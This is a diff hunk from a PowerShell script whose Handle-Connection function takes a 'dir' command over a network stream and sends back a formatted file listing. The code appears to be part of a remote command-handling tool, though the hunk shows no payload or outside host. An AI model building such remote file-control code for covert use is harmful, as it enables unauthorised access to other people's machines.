@@ -286,21 +286,41 @@ function Handle-Connection {
                     # Execute the command
                     if ($command -eq "dir") {
                         try {
-                            $items = @()
-                            Get-ChildItem -Force -ErrorAction Continue | ForEach-Object {
+                            # Get all items with error handling for each item
+                            $items = Get-ChildItem -Force -ErrorAction SilentlyContinue | ForEach-Object {
                                 try {
-                                    $items += "$($_.Name)|$($_.Length)|$($_.CreationTime)|$($_.LastWriteTime)|$($_.PSIsContainer)"
+                                    $name = $_.Name
+                                    # Use 0 for folders and actual size for files
+                                    $size = if ($_.PSIsContainer) { 0 } else { $_.Length }
+                                    $created = $_.CreationTime.ToString("yyyy-MM-dd HH:mm:ss")
+                                    $modified = $_.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
+                                    $isFolder = $_.PSIsContainer.ToString().ToLower()
+                                    
+                                    # Return formatted string
+                                    "$name|$size|$created|$modified|$isFolder"
                                 } catch {
-                                    # Skip items we can't access
+                                    $null
                                 }
-                            }
-                            $output = if ($items.Count -gt 0) {
-                                $items -join "`n"
+                            } | Where-Object { $_ -ne $null }
+                            
+                            if ($items.Count -gt 0) {
+                                $output = $items -join "`n"
+                                $output_bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
+                                $stream.Write($output_bytes, 0, $output_bytes.Length)
                             } else {
-                                "No accessible items"
+                                $output = "No items found"
+                                $output_bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
+                                $stream.Write($output_bytes, 0, $output_bytes.Length)
                             }
+                            $stream.Flush()
+                            continue
+                            
                         } catch {
-                            $output = "[-] Error: $_"
+                            $error_msg = "[-] Error: $_"
+                            $error_bytes = [System.Text.Encoding]::UTF8.GetBytes($error_msg)
+                            $stream.Write($error_bytes, 0, $error_bytes.Length)
+                            $stream.Flush()
+                            continue
                         }
                     } elseif ($command.StartsWith("Rename-Item")) {
                         # Handle file/folder renaming
